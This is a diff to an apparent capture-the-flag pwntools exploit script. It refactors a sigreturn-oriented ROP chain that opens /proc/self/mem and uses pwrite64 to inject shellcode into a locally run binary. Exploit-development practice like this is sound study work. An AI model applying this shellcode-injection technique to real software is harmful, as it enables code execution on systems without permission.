@@ -8,6 +8,24 @@ context.binary = e
 
 p = process(e.path)
 
+#funcs
+
+def srop(rax, rdi = 0, rsi = 0, rdx = 0, r10 = 0):
+    f = SigreturnFrame()
+
+    f.rax = rax
+    f.rdi = rdi
+    f.rsi = rsi
+    f.rdx = rdx
+    f.r10 = r10
+
+    f.rip = off2 + sys
+    f.rsp = off1 + len(s) + len(bytes(f))
+    f.r14 = 0x0
+    f.r15 = 0xf
+
+    return bytes(f)
+
 #vars
 
 off1 = 0x6900000000
@@ -59,36 +77,12 @@ log.info('Shellcode len: ' + hex(len(shellcode)))
 
 #exploit
 
-#use sigreturns to construct rop chain
+#use sigreturns to construct rop chain and write shellcode using /proc/self/mem
 
 s = p64(off2 + sys) #sigreturn
-
-f = SigreturnFrame()
-f.rax = 0x2
-f.rdi = off1 + buf1
-f.rsi = 0x1
-
-f.rip = off2 + sys
-f.rsp = off1 + len(s) + len(bytes(f))
-f.r14 = 0x0
-f.r15 = 0xf
-
-s += bytes(f) #open
+s += srop(0x2, off1 + buf1, 0x1) #open
 s += p64(off2 + sys) #sigreturn
-
-f = SigreturnFrame()
-f.rax = 0x12
-f.rdi = 0x0
-f.rsi = off1 + buf2
-f.rdx = len(asm(shellcode))
-f.r10 = off2 + buf2
-
-f.rip = off2 + sys
-f.rsp = off1 + len(s) + len(bytes(f))
-f.r14 = 0x0
-f.r15 = 0xf
-
-s += bytes(f) #pwrite64
+s += srop(0x12, 0x0, off1 + buf2, len(asm(shellcode)), off2 + buf2) #pwrite64
 s += p64(off2 + buf2) #shellcode
 
 log.info('Rop len: ' + hex(len(s)))
